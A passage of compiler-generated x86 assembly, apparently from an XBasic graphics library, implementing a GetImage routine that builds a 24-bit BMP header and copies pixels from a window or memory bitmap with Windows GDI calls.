	jnz	< A.408			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,108			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.409:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.409			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+16]			;;; i125a
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
funcBody42.server:
;
; [2764] TRECT rect
; .composites = ebp-40	; internal variable
#ifdef GetImage.rect
#undef GetImage.rect
#endif
#define GetImage.rect ebp-44	; exposes local variable 'rect'
;
;
; [2765] BITMAP bm
#ifdef GetImage.bm
#undef GetImage.bm
#endif
#define GetImage.bm ebp-48	; exposes local variable 'bm'
;
;
; [2767] $BI_RGB       = 0' 24-bit RGB
;
; [2768] DIM image[]
	sub	esp,64			;;; i430
	mov	esi,d[ebp+12]			;;; i665
	call	%_FreeArray			;;; i431
	mov	esi,0			;;; i666
	mov	d[ebp+12],esi			;;; i670
	add	esp,64
;
; [2770] IFZ hImage THEN RETURN ($$FALSE)
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0118.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func42.server			;;; i258
else.0118.server:
end.if.0118.server:
;
; [2771] IFZ GetImageType (hImage) THEN RETURN ($$FALSE)
	push	[ebp+8]			;;; i674a
	call	func41.server			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.0119.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func42.server			;;; i258
else.0119.server:
end.if.0119.server:
;
; [2773] IF GetImageType (hImage) = $$IMAGE_SCREEN THEN
	push	[ebp+8]			;;; i674a
	call	func41.server			;;; i619
	cmp	eax,1			;;; i684a
	jne	>> else.011A.server			;;; i219
;
; [2774] GetClientRect (hImage, &rect)
;
; [0] EXTERNAL FUNCTION GetClientRect (hwnd, lpRect)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	_GetClientRect@8			;;; i619
;
; [2775] width  = rect.right
#ifdef GetImage.width
#undef GetImage.width
#endif
#define GetImage.width ebp-52	; exposes local variable 'width'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	d[ebp-52],eax			;;; i670
;
; [2776] height = rect.bottom
#ifdef GetImage.height
#undef GetImage.height
#endif
#define GetImage.height ebp-56	; exposes local variable 'height'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	mov	d[ebp-56],eax			;;; i670
;
; [2777] ELSE
	jmp	end.if.011A.server			;;; i107
else.011A.server:
;
; [2778] hdcMem      = CreateCompatibleDC (NULL)
#ifdef GetImage.hdcMem
#undef GetImage.hdcMem
#endif
#define GetImage.hdcMem ebp-60	; exposes local variable 'hdcMem'
;
#ifdef GetImage.NULL
#undef GetImage.NULL
#endif
#define GetImage.NULL ebp-64	; exposes local variable 'NULL'
;
	push	[ebp-64]			;;; i674a
	call	_CreateCompatibleDC@4			;;; i619
	mov	d[ebp-60],eax			;;; i670
;
; [2779] hBitmapLast = SelectObject (hdcMem, hImage)
#ifdef GetImage.hBitmapLast
#undef GetImage.hBitmapLast
#endif
#define GetImage.hBitmapLast ebp-68	; exposes local variable 'hBitmapLast'
;
	push	[ebp+8]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_SelectObject@8			;;; i619
	mov	d[ebp-68],eax			;;; i670
;
; [2780] GetObjectA (hImage, SIZE(bm), &bm)
;
; [0] EXTERNAL FUNCTION  GetObjectA                 (hObject, nCount, ObjectAddr)
	mov	eax,24			;;; i584
; .xstk42.0000 = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	[ebp-76]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_GetObjectA@12			;;; i619
;
; [2781] width       = bm.width
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp-52],eax			;;; i670
;
; [2782] height      = bm.height
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	d[ebp-56],eax			;;; i670
;
; [2783] END IF
end.if.011A.server:
;
; [2785] dataOffset = 54
#ifdef GetImage.dataOffset
#undef GetImage.dataOffset
#endif
#define GetImage.dataOffset ebp-80	; exposes local variable 'dataOffset'
;
	mov	eax,54			;;; i659
	mov	d[ebp-80],eax			;;; i670
;
; [2787] ' alignment on multiple of 32 bits or 4 bytes
;
; [2789] size = dataOffset + (height * ((width * 3) + 3 AND -4))
#ifdef GetImage.size
#undef GetImage.size
#endif
#define GetImage.size ebp-84	; exposes local variable 'size'
;
	mov	eax,d[ebp-52]			;;; i665
	imul	eax,3			;;; i805
	add	eax,3			;;; i775
	mov	ebx,4			;;; i659
	neg	ebx			;;; i916
	and	eax,ebx			;;; i769
	mov	ebx,d[ebp-56]			;;; i665
	imul	eax,ebx			;;; i805
	mov	ebx,d[ebp-80]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp-84],eax			;;; i670
;
; [2790] upper = size - 1
#ifdef GetImage.upper
#undef GetImage.upper
#endif
#define GetImage.upper ebp-88	; exposes local variable 'upper'
;
	mov	eax,d[ebp-84]			;;; i665
	sub	eax,1			;;; i791
	mov	d[ebp-88],eax			;;; i670
;
; [2791] DIM image[upper]
	sub	esp,64			;;; i430
	mov	eax,d[ebp-88]			;;; i665
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp+12]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073545215			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp+12],eax			;;; i670
;
; [2793] '	Fill BITMAPFILEHEADER
;
; [2794] '		Windows version:  little ENDIAN; no alignment concerns
;
; [2796] iAddr = &image[0]
#ifdef GetImage.iAddr
#undef GetImage.iAddr
#endif
#define GetImage.iAddr ebp-92	; exposes local variable 'iAddr'
;
	mov	edx,d[ebp+12]			;;; i665
	lea	eax,[edx]			;;; i464
	mov	d[ebp-92],eax			;;; i670
;
; [2798] image[0] = 'B'' DIB aka BMP signature
	mov	eax,66			;;; i659
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2799] image[1] = 'M'
	mov	eax,77			;;; i659
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+1]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2800] image[2] = size AND 0x00FF' file size
	mov	eax,d[ebp-84]			;;; i665
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+2]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2801] image[3] = (size >> 8) AND 0x00FF
	mov	eax,d[ebp-84]			;;; i665
	shr	eax,8			;;; i835
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+3]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2802] image[4] = (size >> 16) AND 0x00FF
	mov	eax,d[ebp-84]			;;; i665
	shr	eax,16			;;; i835
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+4]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2803] image[5] = (size >> 24) AND 0x00FF
	mov	eax,d[ebp-84]			;;; i665
	shr	eax,24			;;; i835
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+5]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2804] image[6] = 0
	mov	eax,0			;;; i659
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+6]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2805] image[7] = 0
	mov	eax,0			;;; i659
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+7]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2806] image[8] = 0
	mov	eax,0			;;; i659
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+8]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2807] image[9] = 0
	mov	eax,0			;;; i659
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+9]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2808] image[10] = dataOffset AND 0x00FF' file offset of bitmap data
	mov	eax,d[ebp-80]			;;; i665
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+10]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2809] image[11] = (dataOffset >> 8) AND 0x00FF
	mov	eax,d[ebp-80]			;;; i665
	shr	eax,8			;;; i835
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+11]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2810] image[12] = (dataOffset >> 16) AND 0x00FF
	mov	eax,d[ebp-80]			;;; i665
	shr	eax,16			;;; i835
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+12]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2811] image[13] = (dataOffset >> 24) AND 0x00FF
	mov	eax,d[ebp-80]			;;; i665
	shr	eax,24			;;; i835
	and	eax,255			;;; i769
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+13]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2813] '	fill BITMAPINFOHEADER (first 6 members)
;
; [2815] info = 14
#ifdef GetImage.info
#undef GetImage.info
#endif
#define GetImage.info ebp-96	; exposes local variable 'info'
;
	mov	eax,14			;;; i659
	mov	d[ebp-96],eax			;;; i670
;
; [2816] image[info+0] = 40' XLONG : BITMAPINFOHEADER size
	mov	eax,40			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,0			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2817] image[info+1] = 0
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,1			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2818] image[info+2] = 0
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,2			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2819] image[info+3] = 0
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,3			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2820] image[info+4] = width AND 0x00FF' XLONG : width in pixels
	mov	eax,d[ebp-52]			;;; i665
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,4			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2821] image[info+5] = (width >> 8) AND 0x00FF
	mov	eax,d[ebp-52]			;;; i665
	shr	eax,8			;;; i835
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,5			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2822] image[info+6] = (width >> 16) AND 0x00FF
	mov	eax,d[ebp-52]			;;; i665
	shr	eax,16			;;; i835
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,6			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2823] image[info+7] = (width >> 24) AND 0x00FF
	mov	eax,d[ebp-52]			;;; i665
	shr	eax,24			;;; i835
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,7			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2824] image[info+8] = height AND 0x00FF' XLONG : height in pixels
	mov	eax,d[ebp-56]			;;; i665
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,8			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2825] image[info+9] = (height >> 8) AND 0x00FF
	mov	eax,d[ebp-56]			;;; i665
	shr	eax,8			;;; i835
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,9			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2826] image[info+10] = (height >> 16) AND 0x00FF
	mov	eax,d[ebp-56]			;;; i665
	shr	eax,16			;;; i835
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,10			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2827] image[info+11] = (height >> 24) AND 0x00FF
	mov	eax,d[ebp-56]			;;; i665
	shr	eax,24			;;; i835
	and	eax,255			;;; i769
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,11			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2828] image[info+12] = 1' USHORT : # of planes
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,12			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2829] image[info+13] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,13			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2830] image[info+14] = 24' USHORT : bits per pixel
	mov	eax,24			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,14			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2831] image[info+15] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,15			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2832] image[info+16] = $BI_RGB' XLONG : 24-bit RGB
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,16			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2833] image[info+17] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,17			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2834] image[info+18] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,18			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2835] image[info+19] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,19			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2836] image[info+20] = 0' XLONG : sizeImage
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,20			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2837] image[info+21] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,21			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2838] image[info+22] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,22			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2839] image[info+23] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,23			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2840] image[info+24] = 0' XLONG : xPPM
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,24			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2841] image[info+25] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,25			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2842] image[info+26] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,26			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2843] image[info+27] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,27			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2844] image[info+28] = 0' XLONG : yPPM
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,28			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2845] image[info+29] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,29			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2846] image[info+30] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,30			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2847] image[info+31] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,31			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2848] image[info+32] = 0' XLONG : clrUsed
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,32			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2849] image[info+33] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,33			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2850] image[info+34] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,34			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2851] image[info+35] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,35			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2852] image[info+36] = 0' XLONG : clrImportant
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,36			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2853] image[info+37] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,37			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2854] image[info+38] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,38			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2855] image[info+39] = 0'
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-96]			;;; i665
	add	ebx,39			;;; i775
	mov	ecx,d[ebp+12]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i30
;
; [2857] dataAddr = iAddr + dataOffset
#ifdef GetImage.dataAddr
#undef GetImage.dataAddr
#endif
#define GetImage.dataAddr ebp-100	; exposes local variable 'dataAddr'
;
	mov	eax,d[ebp-92]			;;; i665
	mov	ebx,d[ebp-80]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp-100],eax			;;; i670
;
; [2858] infoAddr = iAddr + 14
#ifdef GetImage.infoAddr
#undef GetImage.infoAddr
#endif
#define GetImage.infoAddr ebp-104	; exposes local variable 'infoAddr'
;
	mov	eax,d[ebp-92]			;;; i665
	add	eax,14			;;; i775
	mov	d[ebp-104],eax			;;; i670
;
; [2860] x = 0
#ifdef GetImage.x
#undef GetImage.x
#endif
#define GetImage.x ebp-108	; exposes local variable 'x'
;
	mov	eax,0			;;; i659
	mov	d[ebp-108],eax			;;; i670
;
; [2861] y = 0
#ifdef GetImage.y
#undef GetImage.y
#endif
#define GetImage.y ebp-112	; exposes local variable 'y'
;
	mov	eax,0			;;; i659
	mov	d[ebp-112],eax			;;; i670
;
; [2863] IF GetImageType (hImage) = $$IMAGE_SCREEN THEN
	push	[ebp+8]			;;; i674a
	call	func41.server			;;; i619
	cmp	eax,1			;;; i684a
	jne	>> else.011B.server			;;; i219
;
; [2864] hdc = GetDC (hImage)
#ifdef GetImage.hdc
#undef GetImage.hdc
#endif
#define GetImage.hdc ebp-116	; exposes local variable 'hdc'
;
;
; [0] EXTERNAL FUNCTION GetDC (hwnd)
	push	[ebp+8]			;;; i674a
	call	_GetDC@4			;;; i619
	mov	d[ebp-116],eax			;;; i670
;
; [2865] hdcTmp	= CreateCompatibleDC (hdc)
#ifdef GetImage.hdcTmp
#undef GetImage.hdcTmp
#endif
#define GetImage.hdcTmp ebp-120	; exposes local variable 'hdcTmp'
;
	push	[ebp-116]			;;; i674a
	call	_CreateCompatibleDC@4			;;; i619
	mov	d[ebp-120],eax			;;; i670
;
; [2866] hBitmap	= CreateCompatibleBitmap (hdc, width, height)
#ifdef GetImage.hBitmap
#undef GetImage.hBitmap
#endif
#define GetImage.hBitmap ebp-124	; exposes local variable 'hBitmap'
;
;
; [0] EXTERNAL FUNCTION  CreateCompatibleBitmap     (hdc, width, height)
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-116]			;;; i674a
	call	_CreateCompatibleBitmap@12			;;; i619
	mov	d[ebp-124],eax			;;; i670
;
; [2867] hBitmapOld = SelectObject (hdcTmp, hBitmap)
#ifdef GetImage.hBitmapOld
#undef GetImage.hBitmapOld
#endif
#define GetImage.hBitmapOld ebp-128	; exposes local variable 'hBitmapOld'
;
	push	[ebp-124]			;;; i674a
	push	[ebp-120]			;;; i674a
	call	_SelectObject@8			;;; i619
	mov	d[ebp-128],eax			;;; i670
;
; [2868] BitBlt (hdcTmp, 0, 0, width, height, hdc, x, y, $$SRCCOPY)
	push	13369376			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-108]			;;; i674a
	push	[ebp-116]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-120]			;;; i674a
	call	_BitBlt@36			;;; i619
;
; [2869] hBitmap	= SelectObject (hdcTmp, hBitmapOld)' bitmap not in hdc
	push	[ebp-128]			;;; i674a
	push	[ebp-120]			;;; i674a
	call	_SelectObject@8			;;; i619
	mov	d[ebp-124],eax			;;; i670
;
; [2870] ok = GetDIBits(hdc, hBitmap, 0, height, dataAddr, infoAddr, $$DIB_RGB_COLORS)
#ifdef GetImage.ok
#undef GetImage.ok
#endif
#define GetImage.ok ebp-132	; exposes local variable 'ok'
;
;
; [0] EXTERNAL FUNCTION  GetDIBits                  (hdc, hBitmap, startScan, scanLines, dataAddr, infoAddr, usage)
	push	0			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-100]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	0			;;; i656a
	push	[ebp-124]			;;; i674a
	push	[ebp-116]			;;; i674a
	call	_GetDIBits@28			;;; i619
	mov	d[ebp-132],eax			;;; i670
;
; [2871] ReleaseDC (hImage, hdc)
;
; [0] EXTERNAL FUNCTION ReleaseDC (hwnd, hdc)
	push	[ebp-116]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_ReleaseDC@8			;;; i619
;
; [2872] DeleteDC (hdcTmp)
	push	[ebp-120]			;;; i674a
	call	_DeleteDC@4			;;; i619
;
; [2873] DeleteObject (hBitmapOld)
	push	[ebp-128]			;;; i674a
	call	_DeleteObject@4			;;; i619
;
; [2874] DeleteObject (hBitmap)
	push	[ebp-124]			;;; i674a
	call	_DeleteObject@4			;;; i619
;
; [2875] ELSE
	jmp	end.if.011B.server			;;; i107
else.011B.server:
;
; [2876] ok = GetDIBits (hdcMem, hImage, 0, height, dataAddr, infoAddr, $$DIB_RGB_COLORS)
	push	0			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-100]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_GetDIBits@28			;;; i619
	mov	d[ebp-132],eax			;;; i670
;
; [2877] SelectObject (hdcMem, hBitmapLast)
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_SelectObject@8			;;; i619
;
; [2878] DeleteDC (hdcMem)
	push	[ebp-60]			;;; i674a
	call	_DeleteDC@4			;;; i619
;
; [2879] END IF
end.if.011B.server:
;
; [2881] IFZ ok THEN RETURN $$FALSE ELSE RETURN $$TRUE
	mov	eax,d[ebp-132]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.011C.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func42.server			;;; i258
	jmp	end.if.011C.server			;;; i107
else.011C.server:
	mov	eax,-1			;;; i659
	jmp	end.func42.server			;;; i258
end.if.011C.server:
;
; [2883] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetImage.server:  ;;; Function end label for Assembly Programmers.
end.func42.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetImage ()  *****
;  *****
;
; [2886] FUNCTION GetImageType (hImage)
.code
;
#ifdef GetImageType.hImage
#undef GetImageType.hImage
#endif
#define GetImageType.hImage ebp+8	; exposes function argument 'hImage'
;
align 16
_GetImageType.server@4:
;  *****
;  *****  FUNCTION  GetImageType ()  *****
;  *****
func41.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody41.server:
;
; [2888] SELECT CASE TRUE
;
; [2889] CASE IsWindow (hImage) 						: RETURN $$IMAGE_SCREEN
;
; [0] EXTERNAL FUNCTION IsWindow (hwnd)
	push	[ebp+8]			;;; i674a
	call	_IsWindow@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> case.011D.0001.server			;;; i221
	mov	eax,1			;;; i659
	jmp	end.func41.server			;;; i258
;
; [2890] CASE GetObjectType (hImage) = $$OBJ_BITMAP 	: RETURN $$IMAGE_MEMORY
	jmp	end.select.011D.server			;;; i69
case.011D.0001.server:
;
; [0] EXTERNAL FUNCTION  GetObjectType              (hGdiObj)
